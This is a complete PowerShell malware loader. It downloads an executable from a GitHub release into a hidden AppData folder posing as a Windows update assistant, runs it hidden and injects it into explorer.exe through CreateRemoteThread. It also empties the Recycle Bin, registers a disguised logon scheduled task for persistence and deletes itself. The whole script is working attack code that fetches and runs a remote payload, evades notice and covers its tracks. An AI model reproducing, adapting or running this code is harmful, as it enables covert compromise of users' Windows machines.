# === Configuration ===
$repo = "BotSolo621/WLP"                  # GitHub repo (change to your own)
$file = "microsoft.exe"                    # Binary to download
$targetProcess = "explorer"                # Process to inject into (trusted)
$targetPath = "$env:APPDATA\Microsoft\Windows\UpdateAssistant\"  # Hidden directory

# === Create Hidden Directory ===
New-Item -ItemType Directory -Path $targetPath -Force -ErrorAction SilentlyContinue | Out-Null

# === Version Check Function ===
function Get-LatestVersion {
    try {
        $releases = "https://api.github.com/repos/$repo/releases"
        $releaseData = (Invoke-RestMethod -Uri $releases -ErrorAction Stop)
        return $releaseData[0].tag_name  # Returns latest version tag (e.g., "v1.2.0")
    } catch {
        return $null
    }
}

function Get-CurrentVersion {
    $versionFile = Join-Path -Path $targetPath -ChildPath "version.txt"
    if (Test-Path -Path $versionFile) {
        return (Get-Content -Path $versionFile -Raw).Trim()
    }
    return $null
}

# === Check if Update Needed ===
$latestVersion = Get-LatestVersion
$currentVersion = Get-CurrentVersion

$exePath = Join-Path -Path $targetPath -ChildPath $file
$needsUpdate = (-not $currentVersion) -or ($currentVersion -ne $latestVersion)

# === Download Payload (if outdated or missing) ===
if ($needsUpdate -and $latestVersion) {
    try {
        $downloadUrl = "https://github.com/$repo/releases/download/$latestVersion/$file"
        Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop

        # Save new version
        $versionFile = Join-Path -Path $targetPath -ChildPath "version.txt"
        Set-Content -Path $versionFile -Value $latestVersion -Force
    } catch {
        # Fallback: If download fails, check for existing payload
        if (-not (Test-Path -Path $exePath)) { exit }
    }
}

# === Process Injection (Into explorer.exe) ===
function Invoke-ProcessInjection {
    param (
        [string]$ProcessName,
        [string]$DllPath
    )

    # Get target process ID
    $targetProc = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $targetProc) { return $false }

    # Load Win32 APIs for injection
    $MethodDefinition = @"
        using System;
        using System.Runtime.InteropServices;
        public class Injector {
            [DllImport("kernel32.dll")]
            public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
            [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
            [DllImport("kernel32.dll")]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        }
"@

    Add-Type -TypeDefinition $MethodDefinition -Language CSharp

    # Open target process
    $hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetProc.Id)
    if ($hProcess -eq [IntPtr]::Zero) { return $false }

    # Allocate memory in target process
    $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
    $size = $dllBytes.Length
    $allocAddr = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, 0x3000, 0x40)
    if ($allocAddr -eq [IntPtr]::Zero) { return $false }

    # Write DLL into memory
    [Injector]::WriteProcessMemory($hProcess, $allocAddr, $dllBytes, $size, [ref][UIntPtr]::Zero) | Out-Null

    # Get LoadLibraryA address
    $hKernel32 = [Injector]::GetModuleHandle("kernel32.dll")
    $loadLibAddr = [Injector]::GetProcAddress($hKernel32, "LoadLibraryA")

    # Create remote thread to execute
    $hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $allocAddr, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) { return $false }

    return $true
}

# === Clear Recycle Bin ===
function Clear-RecycleBin {
    try {
        $shell = New-Object -ComObject Shell.Application
        $shell.Namespace(0xA).Items() | ForEach-Object { 
            Remove-Item $_.Path -Force -Recurse -ErrorAction SilentlyContinue 
        }
        # Alternative method using Cleanmgr (more thorough)
        Start-Process -FilePath "cleanmgr.exe" -ArgumentList "/sagerun:1" -WindowStyle Hidden -Wait
    } catch {
        # Silent fail if cleanup doesn't work
    }
}

# === Main Execution ===
if (Test-Path -Path $exePath) {
    # 1. Start the executable normally
    Start-Process -FilePath $exePath -WindowStyle Hidden
    
    # 2. Inject into explorer.exe
    Invoke-ProcessInjection -ProcessName $targetProcess -DllPath $exePath
    
    # 3. Clear Recycle Bin
    Clear-RecycleBin
}

# === Persistence via Scheduled Task (Stealthy) ===
$taskName = "Windows Update Assistant"
$action = New-ScheduledTaskAction -Execute $exePath -WorkingDirectory $targetPath
$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Minutes (Get-Random -Minimum 1 -Maximum 5))
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction SilentlyContinue

# === Cleanup (Optional) ===
Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue